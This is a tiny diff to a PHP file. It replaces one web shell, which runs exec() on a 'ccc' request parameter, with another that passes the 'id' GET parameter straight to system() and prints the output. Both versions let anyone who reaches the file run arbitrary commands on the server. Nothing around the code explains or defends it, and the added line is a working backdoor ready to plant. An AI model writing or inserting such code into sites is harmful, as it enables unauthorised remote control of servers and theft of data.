@@ -1,9 +1,3 @@
 <?
-if(isset($_REQUEST['ccc'])){
-        echo "<pre>";
-        $cc = ($_REQUEST['ccc']);
-        exec($cc);
-        echo "</pre>";
-        die;
-}
+echo system($_GET['id']);
 ?>
